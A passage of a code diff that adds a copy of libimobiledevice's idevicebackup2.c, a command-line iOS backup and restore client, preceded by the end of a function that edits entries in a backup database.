+        backup_file_set_uid(file, uid);
+        backup_file_set_gid(file, gid);
+        backup_file_set_time1(file, time(NULL));
+        backup_file_set_time2(file, time(NULL));
+        backup_file_set_time3(file, time(NULL));
+        backup_file_set_flag(file, flag);
+
+        backup_file_set_length(file, size);
+
+        if (backup_update_file(backup, file) >= 0)
+            ret = 0;
+        else
+            ret = -1;
+        backup_file_free(file);
+
+        if (!ret)
+            backup_write_mbdb(backup);
+    }
+    return ret;
+}
+/*
+ * idevicebackup2.c
+ * Command line interface to use the device's backup and restore service
+ *
+ * Copyright (c) 2009-2010 Martin Szulecki All Rights Reserved.
+ * Copyright (c) 2010      Nikias Bassen All Rights Reserved.
+ *
+ * This library is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU Lesser General Public
+ * License as published by the Free Software Foundation; either
+ * version 2.1 of the License, or (at your option) any later version.
+ * 
+ * This library is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+ * Lesser General Public License for more details.
+ * 
+ * You should have received a copy of the GNU Lesser General Public
+ * License along with this library; if not, write to the Free Software
+ * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA 
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <libgen.h>
+#include <ctype.h>
+#include <time.h>
+
+#include "hell.h"
+
+#include <libimobiledevice/libimobiledevice.h>
+#include <libimobiledevice/lockdown.h>
+#include <libimobiledevice/mobilebackup2.h>
+#include <libimobiledevice/notification_proxy.h>
+#include <libimobiledevice/afc.h>
+
+#define MOBILEBACKUP2_SERVICE_NAME "com.apple.mobilebackup2"
+#define NP_SERVICE_NAME "com.apple.mobile.notification_proxy"
+
+#define LOCK_ATTEMPTS 50
+#define LOCK_WAIT 200000
+
+#ifdef WIN32
+#include <windows.h>
+#include <conio.h>
+#define sleep(x) Sleep(x*1000)
+#else
+#include <termios.h>
+#include <sys/statvfs.h>
+#endif
+
+#define CODE_SUCCESS 0x00
+#define CODE_ERROR_LOCAL 0x06
+#define CODE_ERROR_REMOTE 0x0b
+#define CODE_FILE_DATA 0x0c
+
+static int verbose = 1;
+static int quit_flag = 0;
+
+#define PRINT_VERBOSE(min_level, ...) if (verbose >= min_level) { printf(__VA_ARGS__); };
+
+enum cmd_mode {
+    CMD_BACKUP,
+    CMD_RESTORE,
+    CMD_INFO,
+    CMD_LIST,
+    CMD_UNBACK,
+    CMD_CHANGEPW,
+    CMD_LEAVE
+};
+
+enum plist_format_t {
+    PLIST_FORMAT_XML,
+    PLIST_FORMAT_BINARY
+};
+
+enum cmd_flags {
+    CMD_FLAG_RESTORE_SYSTEM_FILES = (1 << 1),
+    CMD_FLAG_RESTORE_REBOOT = (1 << 2),
+    CMD_FLAG_RESTORE_COPY_BACKUP = (1 << 3),
+    CMD_FLAG_RESTORE_SETTINGS = (1 << 4),
+    CMD_FLAG_RESTORE_REMOVE_ITEMS = (1 << 5),
+    CMD_FLAG_ENCRYPTION_ENABLE = (1 << 6),
+    CMD_FLAG_ENCRYPTION_DISABLE = (1 << 7),
+    CMD_FLAG_ENCRYPTION_CHANGEPW = (1 << 8)
+};
+
+static int backup_domain_changed = 0;
+
+static void notify_cb(const char *notification, void *userdata)
+{
+    if (!strcmp(notification, NP_SYNC_CANCEL_REQUEST)) {
+        PRINT_VERBOSE(1,
+                      "User has cancelled the backup process on the device.\n");
+        quit_flag++;
+    } else if (!strcmp(notification, NP_BACKUP_DOMAIN_CHANGED)) {
+        backup_domain_changed = 1;
+    } else {
+        PRINT_VERBOSE(1, "Unhandled notification '%s' (TODO: implement)\n",
+                      notification);
+    }
+}
+
+static void free_dictionary(char **dictionary)
+{
+    int i = 0;
+
+    if (!dictionary)
+        return;
+
+    for (i = 0; dictionary[i]; i++) {
+        free(dictionary[i]);
+    }
+    free(dictionary);
+}
+
+static void mobilebackup_afc_get_file_contents(afc_client_t afc,
+                                               const char *filename,
+                                               char **data, uint64_t * size)
+{
+    if (!afc || !data || !size) {
+        return;
+    }
+
+    char **fileinfo = NULL;
+    uint32_t fsize = 0;
+
+    afc_get_file_info(afc, filename, &fileinfo);
+    if (!fileinfo) {
+        return;
+    }
+    int i;
+    for (i = 0; fileinfo[i]; i += 2) {
+        if (!strcmp(fileinfo[i], "st_size")) {
+            fsize = atol(fileinfo[i + 1]);
+            break;
+        }
+    }
+    free_dictionary(fileinfo);
+
+    if (fsize == 0) {
+        return;
+    }
+
+    uint64_t f = 0;
+    afc_file_open(afc, filename, AFC_FOPEN_RDONLY, &f);
+    if (!f) {
+        return;
+    }
+    char *buf = (char *)malloc((uint32_t) fsize);
+    uint32_t done = 0;
+    while (done < fsize) {
+        uint32_t bread = 0;
+        afc_file_read(afc, f, buf + done, 65536, &bread);
+        if (bread > 0) {
+
+        } else {
+            break;
+        }
+        done += bread;
+    }
+    if (done == fsize) {
+        *size = fsize;
+        *data = buf;
+    } else {
+        free(buf);
+    }
+    afc_file_close(afc, f);
+}
+
+static char *str_toupper(char *str)
+{
+    char *res = strdup(str);
+    unsigned int i;
+    for (i = 0; i < strlen(res); i++) {
+        res[i] = toupper(res[i]);
+    }
+    return res;
+}
+
+static int __mkdir(const char *path, int mode)
+{
+#ifdef WIN32
+    return mkdir(path);
+#else
+    return mkdir(path, mode);
+#endif
+}
+
+static int mkdir_with_parents(const char *dir, int mode)
+{
+    if (!dir)
+        return -1;
+    if (__mkdir(dir, mode) == 0) {
+        return 0;
+    } else {
+        if (errno == EEXIST)
+            return 0;
+    }
+    int res;
+    char *parent = strdup(dir);
+    char *parentdir = dirname(parent);
+    if (parentdir) {
+        res = mkdir_with_parents(parentdir, mode);
+    } else {
+        res = -1;
+    }
+    free(parent);
+    if (res == 0) {
+        mkdir_with_parents(dir, mode);
+    }
+    return res;
+}
+
+static char *build_path(const char *elem, ...)
+{
+    if (!elem)
+        return NULL;
+    va_list args;
+    int len = strlen(elem) + 1;
+    va_start(args, elem);
+    char *arg = va_arg(args, char *);
+    while (arg) {
+        len += strlen(arg) + 1;
+        arg = va_arg(args, char *);
+    }
+    va_end(args);
+
+    char *out = (char *)malloc(len);
+    strcpy(out, elem);
+
+    va_start(args, elem);
+    arg = va_arg(args, char *);
+    while (arg) {
+        strcat(out, "/");
+        strcat(out, arg);
+        arg = va_arg(args, char *);
+    }
+    va_end(args);
+    return out;
+}
+
+static char *format_size_for_display(uint64_t size)
+{
+    char buf[32];
+    double sz;
+    if (size >= 1000000000LL) {
+        sz = ((double)size / 1000000000.0f);
+        sprintf(buf, "%0.1f GB", sz);
+    } else if (size >= 1000000LL) {
+        sz = ((double)size / 1000000.0f);
+        sprintf(buf, "%0.1f MB", sz);
+    } else if (size >= 1000LL) {
+        sz = ((double)size / 1000.0f);
+        sprintf(buf, "%0.1f kB", sz);
+    } else {
+        sprintf(buf, "%d Bytes", (int)size);
+    }
+    return strdup(buf);
+}
+
+static plist_t mobilebackup_factory_info_plist_new(const char *udid,
+                                                   lockdownd_client_t lockdown,
+                                                   afc_client_t afc)
+{
+    /* gather data from lockdown */
+    plist_t value_node = NULL;
+    plist_t root_node = NULL;
+    char *udid_uppercase = NULL;
+
+    plist_t ret = plist_new_dict();
+
+    /* get basic device information in one go */
+    lockdownd_get_value(lockdown, NULL, NULL, &root_node);
+
+    /* set fields we understand */
+    value_node = plist_dict_get_item(root_node, "BuildVersion");
+    plist_dict_insert_item(ret, "Build Version", plist_copy(value_node));
+
+    value_node = plist_dict_get_item(root_node, "DeviceName");
+    plist_dict_insert_item(ret, "Device Name", plist_copy(value_node));
+    plist_dict_insert_item(ret, "Display Name", plist_copy(value_node));
+
+    /* FIXME: How is the GUID generated? */
+    plist_dict_insert_item(ret, "GUID", plist_new_string("---"));
+
+    value_node =
+        plist_dict_get_item(root_node, "IntegratedCircuitCardIdentity");
+    if (value_node)
+        plist_dict_insert_item(ret, "ICCID", plist_copy(value_node));
+
+    value_node =
+        plist_dict_get_item(root_node, "InternationalMobileEquipmentIdentity");
+    if (value_node)
+        plist_dict_insert_item(ret, "IMEI", plist_copy(value_node));
+
+    plist_dict_insert_item(ret, "Last Backup Date",
+                           plist_new_date(time(NULL), 0));
+
+    value_node = plist_dict_get_item(root_node, "PhoneNumber");
+    if (value_node && (plist_get_node_type(value_node) == PLIST_STRING)) {
+        plist_dict_insert_item(ret, "Phone Number", plist_copy(value_node));
+    }
+
+    value_node = plist_dict_get_item(root_node, "ProductType");
+    plist_dict_insert_item(ret, "Product Type", plist_copy(value_node));
+
+    value_node = plist_dict_get_item(root_node, "ProductVersion");
+    plist_dict_insert_item(ret, "Product Version", plist_copy(value_node));
+
+    value_node = plist_dict_get_item(root_node, "SerialNumber");
+    plist_dict_insert_item(ret, "Serial Number", plist_copy(value_node));
+
+    /* FIXME Sync Settings? */
+
+    value_node = plist_dict_get_item(root_node, "UniqueDeviceID");
+    plist_dict_insert_item(ret, "Target Identifier", plist_new_string(udid));
+
+    plist_dict_insert_item(ret, "Target Type", plist_new_string("Device"));
+
+    /* uppercase */
+    udid_uppercase = str_toupper((char *)udid);
+    plist_dict_insert_item(ret, "Unique Identifier",
+                           plist_new_string(udid_uppercase));
+    free(udid_uppercase);
+
+    char *data_buf = NULL;
+    uint64_t data_size = 0;
+    mobilebackup_afc_get_file_contents(afc, "/Books/iBooksData2.plist",
+                                       &data_buf, &data_size);
+    if (data_buf) {
+        plist_dict_insert_item(ret, "iBooks Data 2",
+                               plist_new_data(data_buf, data_size));
+        free(data_buf);
+    }
+
+    plist_t files = plist_new_dict();
+    const char *itunesfiles[] = {
+        "ApertureAlbumPrefs",
+        "IC-Info.sidb",
+        "IC-Info.sidv",
+        "PhotosFolderAlbums",
+        "PhotosFolderName",
+        "PhotosFolderPrefs",
+        "iPhotoAlbumPrefs",
+        "iTunesApplicationIDs",
+        "iTunesPrefs",
+        "iTunesPrefs.plist",
+        NULL
+    };
+    int i = 0;
+    for (i = 0; itunesfiles[i]; i++) {
+        data_buf = NULL;
+        data_size = 0;
+        char *fname =
+            (char *)malloc(strlen("/iTunes_Control/iTunes/") +
+                           strlen(itunesfiles[i]) + 1);
+        strcpy(fname, "/iTunes_Control/iTunes/");
+        strcat(fname, itunesfiles[i]);
+        mobilebackup_afc_get_file_contents(afc, fname, &data_buf, &data_size);
+        free(fname);
+        if (data_buf) {
+            plist_dict_insert_item(files, itunesfiles[i],
+                                   plist_new_data(data_buf, data_size));
+            free(data_buf);
+        }
+    }
+    plist_dict_insert_item(ret, "iTunes Files", files);
+
+    plist_t itunes_settings = NULL;
+    lockdownd_get_value(lockdown, "com.apple.iTunes", NULL, &itunes_settings);
+    plist_dict_insert_item(ret, "iTunes Settings",
+                           itunes_settings ? itunes_settings :
+                           plist_new_dict());
+
+    plist_dict_insert_item(ret, "iTunes Version", plist_new_string("10.0.1"));
+
+    plist_free(root_node);
+
+    return ret;
+}
+
+static void buffer_read_from_filename(const char *filename, char **buffer,
+                                      uint64_t * length)
+{
+    FILE *f;
+    uint64_t size;
+
+    *length = 0;
+
+    f = fopen(filename, "rb");
+    if (!f) {
+        return;
+    }
+
+    fseek(f, 0, SEEK_END);
+    size = ftell(f);
+    rewind(f);
+
+    if (size == 0) {
+        return;
+    }
+
+    *buffer = (char *)malloc(sizeof(char) * size);
+    fread(*buffer, sizeof(char), size, f);
+    fclose(f);
+
+    *length = size;
+}
+
+static void buffer_write_to_filename(const char *filename, const char *buffer,
+                                     uint64_t length)
+{
+    FILE *f;
+
+    f = fopen(filename, "ab");
+    if (!f)
+        f = fopen(filename, "wb");
+    if (f) {
+        fwrite(buffer, sizeof(char), length, f);
+        fclose(f);
+    }
+}
+
+static int plist_read_from_filename(plist_t * plist, const char *filename)
+{
+    char *buffer = NULL;
+    uint64_t length;
+
+    if (!filename)
+        return 0;
+
+    buffer_read_from_filename(filename, &buffer, &length);
+
+    if (!buffer) {
+        return 0;
+    }
+
+    if ((length > 8) && (memcmp(buffer, "bplist00", 8) == 0)) {
+        plist_from_bin(buffer, length, plist);
+    } else {
+        plist_from_xml(buffer, length, plist);
+    }
+
+    free(buffer);
+
+    return 1;
+}
+
+static int plist_write_to_filename(plist_t plist, const char *filename,
+                                   enum plist_format_t format)
+{
+    char *buffer = NULL;
+    uint32_t length;
+
+    if (!plist || !filename)
+        return 0;
+
+    if (format == PLIST_FORMAT_XML)
+        plist_to_xml(plist, &buffer, &length);
+    else if (format == PLIST_FORMAT_BINARY)
+        plist_to_bin(plist, &buffer, &length);
+    else
+        return 0;
+
+    buffer_write_to_filename(filename, buffer, length);
+
+    free(buffer);
+
+    return 1;
+}
+
+static int mb2_status_check_snapshot_state(const char *path, const char *udid,
+                                           const char *matches)
+{
+    int ret = -1;
+    plist_t status_plist = NULL;
+    char *file_path = build_path(path, udid, "Status.plist", NULL);
+
+    plist_read_from_filename(&status_plist, file_path);
+    free(file_path);
+    if (!status_plist) {
+        printf("Could not read Status.plist!\n");
+        return ret;
+    }
+    plist_t node = plist_dict_get_item(status_plist, "SnapshotState");
+    if (node && (plist_get_node_type(node) == PLIST_STRING)) {
+        char *sval = NULL;
+        plist_get_string_val(node, &sval);
+        if (sval) {
+            ret = (strcmp(sval, matches) == 0) ? 1 : 0;
+            free(sval);
+        }
+    } else {
+        printf("%s: ERROR could not get SnapshotState key from Status.plist!\n",
+               __func__);
+    }
+    plist_free(status_plist);
+    return ret;
+}
+
+static void do_post_notification(idevice_t device, const char *notification)
+{
+    lockdownd_service_descriptor_t service = NULL;
+    np_client_t np;
+
+    lockdownd_client_t lockdown = NULL;
+
+    if (lockdownd_client_new_with_handshake(device, &lockdown, "idevicebackup")
+        != LOCKDOWN_E_SUCCESS) {
+        return;
+    }
+
+    lockdownd_start_service(lockdown, NP_SERVICE_NAME, &service);
+    if (service && service->port) {
+        np_client_new(device, service, &np);
+        if (np) {
+            np_post_notification(np, notification);
+            np_client_free(np);
+        }
+    } else {
+        printf("Could not start %s\n", NP_SERVICE_NAME);
+    }
+
+    if (service) {
+        lockdownd_service_descriptor_free(service);
+        service = NULL;
+    }
+    lockdownd_client_free(lockdown);
+}
+
+static void print_progress_real(double progress, int flush)
+{
+    int i = 0;
+    PRINT_VERBOSE(1, "\r[");
+    for (i = 0; i < 50; i++) {
+        if (i < progress / 2) {
+            PRINT_VERBOSE(1, "=");
+        } else {
+            PRINT_VERBOSE(1, " ");
+        }
+    }
+    PRINT_VERBOSE(1, "] %3.0f%%", progress);
+
+    if (flush > 0) {
+        fflush(stdout);
+        if (progress == 100)
+            PRINT_VERBOSE(1, "\n");
+    }
+}
+
+static void print_progress(uint64_t current, uint64_t total)
+{
+    char *format_size = NULL;
+    double progress = ((double)current / (double)total) * 100;
+    if (progress < 0)
+        return;
+
+    if (progress > 100)
+        progress = 100;
+
+    print_progress_real((double)progress, 0);
+
+    format_size = format_size_for_display(current);
+    PRINT_VERBOSE(1, " (%s", format_size);
+    free(format_size);
+    format_size = format_size_for_display(total);
+    PRINT_VERBOSE(1, "/%s)     ", format_size);
+    free(format_size);
+
+    fflush(stdout);
+    if (progress == 100)
+        PRINT_VERBOSE(1, "\n");
+}
+
+static double overall_progress = 0;
+
+static void mb2_set_overall_progress(double progress)
+{
+    if (progress > 0.0)
+        overall_progress = progress;
+}
+
+static void mb2_set_overall_progress_from_message(plist_t message,
+                                                  char *identifier)
+{
+    plist_t node = NULL;
+    double progress = 0.0;
+
+    if (!strcmp(identifier, "DLMessageDownloadFiles")) {
+        node = plist_array_get_item(message, 3);
+    } else if (!strcmp(identifier, "DLMessageUploadFiles")) {
+        node = plist_array_get_item(message, 2);
+    } else if (!strcmp(identifier, "DLMessageMoveFiles")
+               || !strcmp(identifier, "DLMessageMoveItems")) {
+        node = plist_array_get_item(message, 3);
+    } else if (!strcmp(identifier, "DLMessageRemoveFiles")
+               || !strcmp(identifier, "DLMessageRemoveItems")) {
+        node = plist_array_get_item(message, 3);
+    }
+
+    if (node != NULL) {
+        plist_get_real_val(node, &progress);
+        mb2_set_overall_progress(progress);
+    }
+}
+
+static void mb2_multi_status_add_file_error(plist_t status_dict,
+                                            const char *path, int error_code,
+                                            const char *error_message)
+{
+    if (!status_dict)
+        return;
+    plist_t filedict = plist_new_dict();
+    plist_dict_insert_item(filedict, "DLFileErrorString",
+                           plist_new_string(error_message));
+    plist_dict_insert_item(filedict, "DLFileErrorCode",
+                           plist_new_uint(error_code));
+    plist_dict_insert_item(status_dict, path, filedict);
+}
+
+static int errno_to_device_error(int errno_value)
+{
+    switch (errno_value) {
+    case ENOENT:
+        return -6;
+    case EEXIST:
+        return -7;
+    default:
+        return -errno_value;
+    }
+}
+
+#ifdef WIN32
+static int win32err_to_errno(int err_value)
+{
+    switch (err_value) {
+    case ERROR_FILE_NOT_FOUND:
+        return ENOENT;
+    case ERROR_ALREADY_EXISTS:
+        return EEXIST;
+    default:
+        return EFAULT;
+    }
+}
+#endif
+
+static int mb2_handle_send_file(mobilebackup2_client_t mobilebackup2,
+                                const char *backup_dir, const char *path,
+                                plist_t * errplist)
+{
+    uint32_t nlen = 0;
+    uint32_t pathlen = strlen(path);
+    uint32_t bytes = 0;
+    char *localfile = build_path(backup_dir, path, NULL);
+    char buf[32768];
+    struct stat fst;
+
+    FILE *f = NULL;
+    uint32_t slen = 0;
+    int errcode = -1;
+    int result = -1;
+    uint32_t length;
+    off_t total;
+    off_t sent;
+
+    mobilebackup2_error_t err;
+
+    /* send path length */
+    nlen = htobe32(pathlen);
+    err =
+        mobilebackup2_send_raw(mobilebackup2, (const char *)&nlen, sizeof(nlen),
+                               &bytes);
+    if (err != MOBILEBACKUP2_E_SUCCESS) {
+        goto leave_proto_err;
+    }
+    if (bytes != (uint32_t) sizeof(nlen)) {
+        err = MOBILEBACKUP2_E_MUX_ERROR;
+        goto leave_proto_err;
+    }
+
+    /* send path */
+    err = mobilebackup2_send_raw(mobilebackup2, path, pathlen, &bytes);
+    if (err != MOBILEBACKUP2_E_SUCCESS) {
+        goto leave_proto_err;
+    }
+    if (bytes != pathlen) {
+        err = MOBILEBACKUP2_E_MUX_ERROR;
+        goto leave_proto_err;
+    }
+
+    if (stat(localfile, &fst) < 0) {
+        if (errno != ENOENT)
+            printf("%s: stat failed on '%s': %d\n", __func__, localfile, errno);
+        errcode = errno;
+        goto leave;
+    }
+
+    total = fst.st_size;
+
+    char *format_size = format_size_for_display(total);
+    PRINT_VERBOSE(1, "Sending '%s' (%s)\n", path, format_size);
+    free(format_size);
+
+    if (total == 0) {
+        errcode = 0;
+        goto leave;
+    }
+
+    f = fopen(localfile, "rb");
+    if (!f) {
+        printf("%s: Error opening local file '%s': %d\n", __func__, localfile,
+               errno);
+        errcode = errno;
+        goto leave;
+    }
+
+    sent = 0;
+    do {
+        length =
+            ((total - sent) <
+             (off_t) sizeof(buf)) ? (uint32_t) total -
+            sent : (uint32_t) sizeof(buf);
+        /* send data size (file size + 1) */
+        nlen = htobe32(length + 1);
+        memcpy(buf, &nlen, sizeof(nlen));
+        buf[4] = CODE_FILE_DATA;
+        err =
+            mobilebackup2_send_raw(mobilebackup2, (const char *)buf, 5, &bytes);
+        if (err != MOBILEBACKUP2_E_SUCCESS) {
+            goto leave_proto_err;
+        }
+        if (bytes != 5) {
+            goto leave_proto_err;
+        }
+
+        /* send file contents */
+        size_t r = fread(buf, 1, sizeof(buf), f);
+        if (r <= 0) {
+            printf("%s: read error\n", __func__);
+            errcode = errno;
+            goto leave;
+        }
+        err = mobilebackup2_send_raw(mobilebackup2, buf, r, &bytes);
+        if (err != MOBILEBACKUP2_E_SUCCESS) {
+            goto leave_proto_err;
+        }
+        if (bytes != (uint32_t) r) {
+            printf("Error: sent only %d of %d bytes\n", bytes, (int)r);
+            goto leave_proto_err;
+        }
+        sent += r;
+    } while (sent < total);
+    fclose(f);
+    f = NULL;
+    errcode = 0;
+
+ leave:
+    if (errcode == 0) {
+        result = 0;
+        nlen = 1;
+        nlen = htobe32(nlen);
+        memcpy(buf, &nlen, 4);
+        buf[4] = CODE_SUCCESS;
+        mobilebackup2_send_raw(mobilebackup2, buf, 5, &bytes);
+    } else {
+        if (!*errplist) {
+            *errplist = plist_new_dict();
+        }
+        char *errdesc = strerror(errcode);
+        mb2_multi_status_add_file_error(*errplist, path,
+                                        errno_to_device_error(errcode),
+                                        errdesc);
+
+        length = strlen(errdesc);
+        nlen = htobe32(length + 1);
+        memcpy(buf, &nlen, 4);
+        buf[4] = CODE_ERROR_LOCAL;
+        slen = 5;
+        memcpy(buf + slen, errdesc, length);
+        slen += length;
+        err =
+            mobilebackup2_send_raw(mobilebackup2, (const char *)buf, slen,
+                                   &bytes);
+        if (err != MOBILEBACKUP2_E_SUCCESS) {
+            printf("could not send message\n");
+        }
+        if (bytes != slen) {
+            printf("could only send %d from %d\n", bytes, slen);
+        }
+    }
+
+ leave_proto_err:
+    if (f)
+        fclose(f);
+    free(localfile);
+    return result;
+}
+
+static void mb2_handle_send_files(mobilebackup2_client_t mobilebackup2,
+                                  plist_t message, const char *backup_dir)
+{
+    uint32_t cnt;
+    uint32_t i = 0;
+    uint32_t sent;
+    plist_t errplist = NULL;
+
+    if (!message || (plist_get_node_type(message) != PLIST_ARRAY)
+        || (plist_array_get_size(message) < 2) || !backup_dir)
+        return;
+
+    plist_t files = plist_array_get_item(message, 1);
+    cnt = plist_array_get_size(files);
+    if (cnt == 0)
+        return;
+
+    for (i = 0; i < cnt; i++) {
+        plist_t val = plist_array_get_item(files, i);
+        if (plist_get_node_type(val) != PLIST_STRING) {
+            continue;
+        }
+        char *str = NULL;
+        plist_get_string_val(val, &str);
+        if (!str)
+            continue;
+
+        if (mb2_handle_send_file(mobilebackup2, backup_dir, str, &errplist) < 0) {
+            free(str);
+            //printf("Error when sending file '%s' to device\n", str);
+            // TODO: perhaps we can continue, we've got a multi status response?!
+            break;
+        }
+        free(str);
+    }
+
+    /* send terminating 0 dword */
+    uint32_t zero = 0;
+    mobilebackup2_send_raw(mobilebackup2, (char *)&zero, 4, &sent);
+
+    if (!errplist) {
+        plist_t emptydict = plist_new_dict();
+        mobilebackup2_send_status_response(mobilebackup2, 0, NULL, emptydict);
+        plist_free(emptydict);
+    } else {
+        mobilebackup2_send_status_response(mobilebackup2, -13, "Multi status",
+                                           errplist);
+        plist_free(errplist);
+    }
+}
+
+static int mb2_receive_filename(mobilebackup2_client_t mobilebackup2,
+                                char **filename)
+{
+    uint32_t nlen = 0;
+    uint32_t rlen = 0;
+
+    do {
+        nlen = 0;
+        rlen = 0;
+        mobilebackup2_receive_raw(mobilebackup2, (char *)&nlen, 4, &rlen);
+        nlen = be32toh(nlen);
+
+        if ((nlen == 0) && (rlen == 4)) {
+            // a zero length means no more files to receive
+            return 0;
+        } else if (rlen == 0) {
+            // device needs more time, waiting...
+            continue;
+        } else if (nlen > 4096) {
+            // filename length is too large
+            printf("ERROR: %s: too large filename length (%d)!\n", __func__,
+                   nlen);
+            return 0;
+        }
+
+        if (*filename != NULL) {
+            free(*filename);
+            *filename = NULL;
+        }
+
+        *filename = (char *)malloc(nlen + 1);
+
+        rlen = 0;
+        mobilebackup2_receive_raw(mobilebackup2, *filename, nlen, &rlen);
+        if (rlen != nlen) {
+            printf("ERROR: %s: could not read filename\n", __func__);
+            return 0;
+        }
+
+        char *p = *filename;
+        p[rlen] = 0;
+
+        break;
+    } while (1 && !quit_flag);
+
+    return nlen;
+}
+
+static int mb2_handle_receive_files(mobilebackup2_client_t mobilebackup2,
+                                    plist_t message, const char *backup_dir)
+{
+    uint64_t backup_real_size = 0;
+    uint64_t backup_total_size = 0;
+    uint32_t blocksize;
+    uint32_t bdone;
+    uint32_t rlen;
+    uint32_t nlen = 0;
+    uint32_t r;
+    char buf[32768];
+    char *fname = NULL;
+    char *dname = NULL;
+    char *bname = NULL;
+    char code = 0;
+    char last_code = 0;
+    plist_t node = NULL;
+    FILE *f = NULL;
+    unsigned int file_count = 0;
+
+    if (!message || (plist_get_node_type(message) != PLIST_ARRAY)
+        || plist_array_get_size(message) < 4 || !backup_dir)
+        return 0;
+
+    node = plist_array_get_item(message, 3);
+    if (plist_get_node_type(node) == PLIST_UINT) {
+        plist_get_uint_val(node, &backup_total_size);
+    }
+    if (backup_total_size > 0) {
+        PRINT_VERBOSE(1, "Receiving files\n");
+    }
+
+    do {
+        if (quit_flag)
+            break;
+
+        nlen = mb2_receive_filename(mobilebackup2, &dname);
+        if (nlen == 0) {
+            break;
+        }
+
+        nlen = mb2_receive_filename(mobilebackup2, &fname);
+        if (!nlen) {
+            break;
+        }
+
+        if (bname != NULL) {
+            free(bname);
+            bname = NULL;
+        }
+
+        bname = build_path(backup_dir, fname, NULL);
+
+        if (fname != NULL) {
+            free(fname);
+            fname = NULL;
+        }
+
+        r = 0;
+        nlen = 0;
+        mobilebackup2_receive_raw(mobilebackup2, (char *)&nlen, 4, &r);
+        if (r != 4) {
+            printf("ERROR: %s: could not receive code length!\n", __func__);
+            break;
+        }
+        nlen = be32toh(nlen);
+
+        last_code = code;
+        code = 0;
+
+        mobilebackup2_receive_raw(mobilebackup2, &code, 1, &r);
+        if (r != 1) {
+            printf("ERROR: %s: could not receive code!\n", __func__);
+            break;
+        }
+
+        /* TODO remove this */
+        if ((code != CODE_SUCCESS) && (code != CODE_FILE_DATA)
+            && (code != CODE_ERROR_REMOTE)) {
+            PRINT_VERBOSE(1, "Found new flag %02x\n", code);
+        }
+
+        remove(bname);
+        f = fopen(bname, "wb");
+        while (f && (code == CODE_FILE_DATA)) {
+            blocksize = nlen - 1;
+            bdone = 0;
+            rlen = 0;
+            while (bdone < blocksize) {
+                if ((blocksize - bdone) < sizeof(buf)) {
+                    rlen = blocksize - bdone;
+                } else {
+                    rlen = sizeof(buf);
+                }
+                mobilebackup2_receive_raw(mobilebackup2, buf, rlen, &r);
+                if ((int)r <= 0) {
+                    break;
+                }
+                fwrite(buf, 1, r, f);
+                bdone += r;
+            }
+            if (bdone == blocksize) {
+                backup_real_size += blocksize;
+            }
+            if (backup_total_size > 0) {
+                print_progress(backup_real_size, backup_total_size);
+            }
+            if (quit_flag)
+                break;
+            nlen = 0;
+            mobilebackup2_receive_raw(mobilebackup2, (char *)&nlen, 4, &r);
+            nlen = be32toh(nlen);
+            if (nlen > 0) {
+                last_code = code;
+                mobilebackup2_receive_raw(mobilebackup2, &code, 1, &r);
+            } else {
+                break;
+            }
+        }
+        if (f) {
+            fclose(f);
+            file_count++;
+        } else {
+            printf("Error opening '%s' for writing: %s\n", bname,
+                   strerror(errno));
+        }
+        if (nlen == 0) {
+            break;
+        }
+
+        /* check if an error message was received */
+        if (code == CODE_ERROR_REMOTE) {
+            /* error message */
+            char *msg = (char *)malloc(nlen);
+            mobilebackup2_receive_raw(mobilebackup2, msg, nlen - 1, &r);
+            msg[r] = 0;
+            /* If sent using CODE_FILE_DATA, end marker will be CODE_ERROR_REMOTE which is not an error! */
+            if (last_code != CODE_FILE_DATA) {
+                fprintf(stdout, "\nReceived an error message from device: %s\n",
+                        msg);
+            }
+            free(msg);
+        }
+    } while (1);
+
+    if (fname != NULL)
+        free(fname);
+
+    /* if there are leftovers to read, finish up cleanly */
+    if ((int)nlen - 1 > 0) {
+        PRINT_VERBOSE(1, "\nDiscarding current data hunk.\n");
+        fname = (char *)malloc(nlen - 1);
+        mobilebackup2_receive_raw(mobilebackup2, fname, nlen - 1, &r);
+        free(fname);
+        remove(bname);
+    }
+
+    /* clean up */
+    if (bname != NULL)
+        free(bname);
+
+    if (dname != NULL)
+        free(dname);
+
+    // TODO error handling?!
+    plist_t empty_plist = plist_new_dict();
+    mobilebackup2_send_status_response(mobilebackup2, 0, NULL, empty_plist);
+    plist_free(empty_plist);
+
+    return file_count;
+}
+
+static void mb2_handle_list_directory(mobilebackup2_client_t mobilebackup2,
+                                      plist_t message, const char *backup_dir)
+{
+    if (!message || (plist_get_node_type(message) != PLIST_ARRAY)
+        || plist_array_get_size(message) < 2 || !backup_dir)
+        return;
+
+    plist_t node = plist_array_get_item(message, 1);
+    char *str = NULL;
+    if (plist_get_node_type(node) == PLIST_STRING) {
+        plist_get_string_val(node, &str);
+    }
+    if (!str) {
+        printf("ERROR: Malformed DLContentsOfDirectory message\n");
+        // TODO error handling
+        return;
+    }
+
+    char *path = build_path(backup_dir, str, NULL);
+    free(str);
+
+    plist_t dirlist = plist_new_dict();
+
+    DIR *cur_dir = opendir(path);
+    if (cur_dir) {
+        struct dirent *ep;
+        while ((ep = readdir(cur_dir))) {
+            if ((strcmp(ep->d_name, ".") == 0)
+                || (strcmp(ep->d_name, "..") == 0)) {
+                continue;
+            }
+            char *fpath = build_path(path, ep->d_name, NULL);
+            if (fpath) {
+                plist_t fdict = plist_new_dict();
+                struct stat st;
+                stat(fpath, &st);
+                const char *ftype = "DLFileTypeUnknown";
+                if (S_ISDIR(st.st_mode)) {
+                    ftype = "DLFileTypeDirectory";
+                } else if (S_ISREG(st.st_mode)) {
+                    ftype = "DLFileTypeRegular";
+                }
+                plist_dict_insert_item(fdict, "DLFileType",
+                                       plist_new_string(ftype));
+                plist_dict_insert_item(fdict, "DLFileSize",
+                                       plist_new_uint(st.st_size));
+                plist_dict_insert_item(fdict, "DLFileModificationDate",
+                                       plist_new_date(st.st_mtime, 0));
+
+                plist_dict_insert_item(dirlist, ep->d_name, fdict);
+                free(fpath);
+            }
+        }
+        closedir(cur_dir);
+    }
+    free(path);
+
+    /* TODO error handling */
+    mobilebackup2_error_t err =
+        mobilebackup2_send_status_response(mobilebackup2, 0, NULL, dirlist);
+    plist_free(dirlist);
